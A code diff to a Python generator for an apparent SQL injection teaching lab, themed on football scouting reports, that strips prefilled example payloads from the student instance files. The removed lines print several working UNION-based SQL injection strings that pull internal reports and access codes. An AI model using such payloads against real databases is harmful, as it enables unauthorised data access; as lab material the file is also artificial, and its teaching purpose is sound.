@@ -12,6 +12,7 @@ INSTANCE_JSON_PATH = STUDENT_DIR / "instance.json"
 STUDENT_SEED_PATH = GENERATED_DIR / "student-seed.sql"
 DB_CREDENTIALS_SQL_PATH = GENERATED_DIR / "student-db-credentials.sql"
 SUBMISSION_PATH = STUDENT_DIR / "submissions" / "lab3-results.json"
+TURKEY_PRESSING_REPORT_TITLE = "Fereastra de pressing a Turciei"
 
 ROMANIAN_PLAYERS = [
     "Florin Nita",
@@ -223,20 +224,10 @@ INJECTION_TYPE_CATALOG = {
     "union_basic_internal": {
         "guide": "UNION pe scouting_reports cu filtrare pe randuri interne.",
         "requiredTokens": ["UNION SELECT", "SCOUTING_REPORTS", "INTERNAL"],
-        "examplePayload": (
-            "NU_EXISTA%' UNION SELECT TO_CHAR(sr.match_id), sr.report_title, "
-            "sr.access_code, sr.report_text FROM scouting_reports sr "
-            "WHERE sr.visibility='internal' -- "
-        ),
     },
     "union_parse_internal_text": {
         "guide": "UNION pe scouting_reports cu parsare explicita a report_text.",
         "requiredTokens": ["UNION SELECT", "SCOUTING_REPORTS", "REGEXP_SUBSTR"],
-        "examplePayload": (
-            "NU_EXISTA%' UNION SELECT TO_CHAR(sr.match_id), sr.report_title, "
-            "sr.access_code, REGEXP_SUBSTR(sr.report_text,'FORMATION=([^|]+)',1,1,NULL,1) "
-            "FROM scouting_reports sr WHERE sr.visibility='internal' -- "
-        ),
     },
     "union_dual_internal_reports": {
         "guide": "UNION orientat pe raportul intern al Turciei pentru pressing/watchlist.",
@@ -245,11 +236,6 @@ INJECTION_TYPE_CATALOG = {
             "SCOUTING_REPORTS",
             "FEREASTRA DE PRESSING A TURCIEI",
         ],
-        "examplePayload": (
-            "NU_EXISTA%' UNION SELECT TO_CHAR(sr.match_id), sr.report_title, "
-            "'TR', sr.report_text FROM scouting_reports sr "
-            "WHERE sr.report_title='Fereastra de pressing a Turciei' -- "
-        ),
     },
     "union_targeted_internal_filter": {
         "guide": "UNION pe rapoarte interne, excluzand explicit raportul Turciei.",
@@ -258,21 +244,10 @@ INJECTION_TYPE_CATALOG = {
             "SCOUTING_REPORTS",
             "REPORT_TITLE <>",
         ],
-        "examplePayload": (
-            "NU_EXISTA%' UNION SELECT TO_CHAR(sr.match_id), sr.report_title, "
-            "sr.access_code, sr.report_text FROM scouting_reports sr "
-            "WHERE sr.visibility='internal' AND sr.report_title <> "
-            "'Fereastra de pressing a Turciei' -- "
-        ),
     },
     "union_internal_with_cross_note": {
         "guide": "UNION cu corelare intre nota Romaniei si campul PRESSING.",
         "requiredTokens": ["UNION SELECT", "SCOUTING_REPORTS", "PRESSING"],
-        "examplePayload": (
-            "NU_EXISTA%' UNION SELECT TO_CHAR(sr.match_id), sr.report_title, "
-            "'META', REGEXP_SUBSTR(sr.report_text,'PRESSING=([^|]+)',1,1,NULL,1) "
-            "FROM scouting_reports sr WHERE sr.visibility='internal' -- "
-        ),
     },
     "union_turkey_focus": {
         "guide": "UNION focalizat pe campurile WATCHLIST si PRESSING din nota Turciei.",
@@ -281,11 +256,6 @@ INJECTION_TYPE_CATALOG = {
             "FEREASTRA DE PRESSING A TURCIEI",
             "WATCHLIST",
         ],
-        "examplePayload": (
-            "NU_EXISTA%' UNION SELECT TO_CHAR(sr.match_id), sr.report_title, "
-            "'WATCH', sr.report_text FROM scouting_reports sr "
-            "WHERE sr.report_title='Fereastra de pressing a Turciei' -- "
-        ),
     },
 }
 
@@ -410,7 +380,6 @@ def build_instance(student_number: int) -> dict:
         "challengeInjectionType": challenge_profile["injectionType"],
         "challengeInjectionGuide": injection_details["guide"],
         "challengeInjectionRequiredTokens": injection_details["requiredTokens"],
-        "challengeInjectionExamplePayload": injection_details["examplePayload"],
         "dbUser": "matchday",
         "dbPassword": build_db_password(student_number),
         "requiredFieldIds": challenge_profile["fields"],
@@ -428,6 +397,7 @@ def build_instance(student_number: int) -> dict:
         "publicLine": choose(PUBLIC_BRIEF_LINES, public_digest, 0),
         "pressingWindow": pressing_value,
         "watchlist": watchlist_value,
+        "turkeyPressingReportTitle": TURKEY_PRESSING_REPORT_TITLE,
     }
 
 
@@ -509,7 +479,7 @@ INSERT INTO scouting_reports (
   {instance['turkeyReportId']},
   {instance['matchId']},
   'internal',
-  'Fereastra de pressing a Turciei',
+  '{sql_string(instance['turkeyPressingReportTitle'])}',
   '{sql_string(turkey_text)}',
   'TR-PRESS-{instance['studentNumber']:03d}'
 );
@@ -539,7 +509,7 @@ def build_instance_json(instance: dict) -> dict:
         "challengeInjectionType": instance["challengeInjectionType"],
         "challengeInjectionGuide": instance["challengeInjectionGuide"],
         "challengeInjectionRequiredTokens": instance["challengeInjectionRequiredTokens"],
-        "challengeInjectionExamplePayload": instance["challengeInjectionExamplePayload"],
+        "turkeyPressingReportTitle": instance["turkeyPressingReportTitle"],
         "dbCredentials": {
             "user": instance["dbUser"],
             "password": instance["dbPassword"],
@@ -554,7 +524,7 @@ def build_submission_template(instance: dict) -> dict:
         "instanceId": instance["instanceId"],
         "challengeProfile": instance["challengeProfileId"],
         "challengeInjectionType": instance["challengeInjectionType"],
-        "usedPayload": instance["challengeInjectionExamplePayload"],
+        "usedPayload": "",
     }
 
     for field_id in instance["requiredFieldIds"]:
